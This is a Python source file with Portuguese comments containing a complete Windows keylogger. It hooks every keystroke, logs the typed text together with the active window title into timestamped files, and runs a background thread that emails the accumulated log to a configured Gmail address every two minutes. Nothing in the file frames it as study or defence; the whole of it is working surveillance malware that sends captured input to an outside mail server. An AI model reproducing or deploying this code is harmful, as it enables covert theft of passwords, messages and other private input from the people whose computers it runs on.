import keyboard
import datetime
import win32gui
import os
import smtplib
import time
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==============================
# CONFIGURAÇÃO DO CAMINHO
# ==============================

pasta_script = os.path.dirname(os.path.abspath(__file__))
pasta_logs = os.path.join(pasta_script, "CAPTURAS")
os.makedirs(pasta_logs, exist_ok=True)

nome_log = f"capturas_de_tela_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
arquivo_log = os.path.join(pasta_logs, nome_log)

print("Arquivo de log:", arquivo_log)

# ==============================
# VARIÁVEIS
# ==============================

buffer_texto = ""
janela_atual = ""

# ==============================
# CONFIGURAÇÃO DO SERVIDOR SMTP
# ==============================

SMTP_SERVER = "smtp.gmail.com"   # exemplo: Gmail
SMTP_PORT = 587
EMAIL_REMETENTE = "seu.email@gmail.com"
SENHA = "sua senha xxxx xxxx"
EMAIL_DESTINATARIO = "seu.email@gmail.com"

# ==============================
# FUNÇÕES DE CAPTURA
# ==============================

def janela_ativa():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Janela desconhecida"

def salvar_bloco(janela, texto):
    if texto.strip() == "":
        return
    tempo = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(arquivo_log, "a", encoding="utf-8") as log:
        log.write("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        log.write(f"[{tempo}]\n")
        log.write(f"Janela: {janela}\n")
        log.write("Entrada:\n")
        log.write(texto)
        log.write("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

def registrar(evento):
    global buffer_texto
    global janela_atual

    tecla = evento.name
    janela = janela_ativa()

    # Detecta troca de janela
    if janela != janela_atual:
        salvar_bloco(janela_atual, buffer_texto)
        buffer_texto = ""
        janela_atual = janela
        print("Janela detectada:", janela)

    if not tecla:
        return

    # Tratamento das teclas
    if tecla == "space":
        buffer_texto += " "
    elif tecla == "enter":
        buffer_texto += "\n"
        salvar_bloco(janela_atual, buffer_texto)
        buffer_texto = ""
    elif tecla == "tab":
        buffer_texto += "\t"
    elif tecla == "backspace":
        buffer_texto = buffer_texto[:-1]
    elif keyboard.is_pressed("ctrl") and tecla == "c":
        buffer_texto += "[CTRL+C]"
    elif keyboard.is_pressed("ctrl") and tecla == "v":
        buffer_texto += "[CTRL+V]"
    elif keyboard.is_pressed("ctrl") and tecla == "x":
        buffer_texto += "[CTRL+X]"
    elif len(tecla) == 1:
        buffer_texto += tecla
    else:
        buffer_texto += f"[{tecla.upper()}]"

# ==============================
# FUNÇÃO DE ENVIO DE EMAIL
# ==============================

def enviar_email():
    try:
        with open(arquivo_log, "r", encoding="utf-8") as f:
            conteudo = f.read()

        mensagem = MIMEMultipart()
        mensagem["From"] = EMAIL_REMETENTE
        mensagem["To"] = EMAIL_DESTINATARIO
        mensagem["Subject"] = f"Log capturado: {os.path.basename(arquivo_log)}"
        mensagem.attach(MIMEText(conteudo, "plain"))

        servidor = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        servidor.starttls()
        servidor.login(EMAIL_REMETENTE, SENHA)
        servidor.sendmail(EMAIL_REMETENTE, EMAIL_DESTINATARIO, mensagem.as_string())
        servidor.quit()

        print("E-mail enviado com sucesso!")
    except Exception as e:
        print("Erro ao enviar e-mail:", e)

def loop_envio():
    while True:
        enviar_email()
        time.sleep(120)  # espera 120 segundos

# ==============================
# INÍCIO DO MONITORAMENTO
# ==============================

keyboard.on_press(registrar)

print("Monitoramento iniciado.")
print("Pressione CTRL+C para encerrar.\n")

# Thread para envio automático
thread_envio = threading.Thread(target=loop_envio, daemon=True)
thread_envio.start()

try:
    keyboard.wait()
except KeyboardInterrupt:
    print("\nEncerrando monitoramento...")
    salvar_bloco(janela_atual, buffer_texto)
    print("Relatório salvo em:", arquivo_log)